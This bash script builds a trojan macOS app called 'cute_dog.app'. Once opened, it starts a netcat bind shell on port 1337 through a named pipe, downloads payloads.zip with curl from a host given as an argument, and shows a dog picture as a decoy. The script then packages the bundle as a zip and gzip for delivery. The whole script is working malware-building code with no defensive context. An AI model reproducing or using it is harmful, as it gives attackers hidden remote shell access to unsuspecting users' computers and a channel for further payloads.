#!/bin/bash
mkdir -p cute_dog.app/Contents/MacOS
echo "#!/bin/bash" > cute_dog.app/Contents/MacOS/cute_dog

echo "mkfifo /tmp/pipesh" >> cute_dog.app/Contents/MacOS/cute_dog
echo "/bin/bash /tmp/pipesh | nc -l 1337 > /tmp/pipesh &" >> cute_dog.app/Contents/MacOS/cute_dog


echo "curl http://$1:8000/payloads.zip -o /tmp/payloads.zip" >> cute_dog.app/Contents/MacOS/cute_dog
echo "unzip /tmp/payloads.zip -d /tmp" >> cute_dog.app/Contents/MacOS/cute_dog
echo "open /tmp/cute_dog.jpg" >> cute_dog.app/Contents/MacOS/cute_dog

chmod +x cute_dog.app/Contents/MacOS/cute_dog
zip -r cute_dog.app.zip cute_dog.app
gzip -c cute_dog.app.zip > cute_dog.app.zip.gz
